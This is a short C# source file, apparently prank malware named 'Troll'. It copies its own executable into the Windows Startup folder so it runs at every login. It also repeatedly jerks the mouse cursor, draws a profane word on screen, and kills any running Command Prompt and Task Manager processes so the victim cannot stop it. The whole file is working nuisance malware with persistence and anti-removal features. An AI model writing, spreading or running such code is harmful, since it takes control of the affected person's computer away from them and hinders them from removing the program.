using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Diagnostics;

namespace Troll
{
    class Troll
    {
        static string exePath = Application.ExecutablePath;
        static string exeName = Path.GetFileName(exePath);
        static string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + exeName;
        static Random r = new Random();

        public static void Run()
        {
            int i = 0;
            while (i<21000)
            {
                int currentX = Cursor.Position.X;
                int currentY = Cursor.Position.Y;
                int x = r.Next(currentX - 20, currentX + 20);
                int y = r.Next(currentY - 20, currentY + 20);
                Cursor.Position = new Point(x, y);
                Kill();
                Draw.String("Fuck!", -60, 0, Color.Pink, 400);
                Thread.Sleep(10);
                i++;
            }
        }

        public static void AddToStartup()
        {
            File.Copy(exePath, startupPath);
        }

        public static void Kill()
        {
            Process[] pro = Process.GetProcesses();
            for (int i = 0; i < pro.Length; i++)
            {
                if (pro[i].ProcessName == "cmd" || pro[i].ProcessName == "Taskmgr" || pro[i].ProcessName == "taskmgr")
                    pro[i].Kill();
            }
        }
    }
}
